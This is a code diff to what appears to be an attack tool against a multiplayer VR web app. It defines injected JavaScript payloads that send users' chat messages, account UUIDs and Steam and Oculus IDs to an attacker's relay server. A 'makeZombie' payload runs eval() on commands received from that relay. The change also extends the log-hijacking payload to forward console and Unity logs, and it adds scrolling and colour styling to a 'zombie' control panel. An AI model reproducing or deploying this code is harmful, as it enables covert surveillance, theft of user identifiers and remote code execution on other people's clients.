@@ -467,7 +467,7 @@ let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.qu
 let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
 let makeZombie = `var sz=new WebSocket('${relayServer}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};`;
 let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
-let persistentLogsEavesdropping = `console.log = function(){var args=arguments; var sl=new WebSocket('${relayServer}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:'console.log',message:args}));sl.close();};};`;
+let persistentLogsEavesdropping = `var nl = function(level, args){var sl=new WebSocket('${relayServer}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:level,message:args}));sl.close();};}; console.log=function(){nl('console.log',arguments)};Unity.log=function(){nl('Unity.log',arguments)};Unity.logError=function(){nl('Unity.logError',arguments)};`;
 //endregion
 
 let NAME = textName;
@@ -1315,6 +1315,9 @@ function ZombieControlUI(zombie){
             document.createTextNode(date.toLocaleTimeString()+' '+roomId+' '+message)
         );
         this.chatElement.appendChild(messageElement);
+
+        // scroll down
+        this.chatElement.scrollTop = this.chatElement.scrollHeight;
     };
 
     this.renderLogMessage = function(level, logArgs){
@@ -1331,10 +1334,19 @@ function ZombieControlUI(zombie){
         }
 
         let messageElement = document.createElement('p');
+        if(level === 'Unity.log'){
+            messageElement.classList.add('text-info');
+        }
+        else if(level === 'Unity.logError'){
+            messageElement.classList.add('text-danger');
+        }
         messageElement.appendChild(
             document.createTextNode(level + logMessage)
         );
         this.logsElement.appendChild(messageElement);
+
+        // scroll down
+        this.logsElement.scrollTop = this.logsElement.scrollHeight;
     };
 }
 
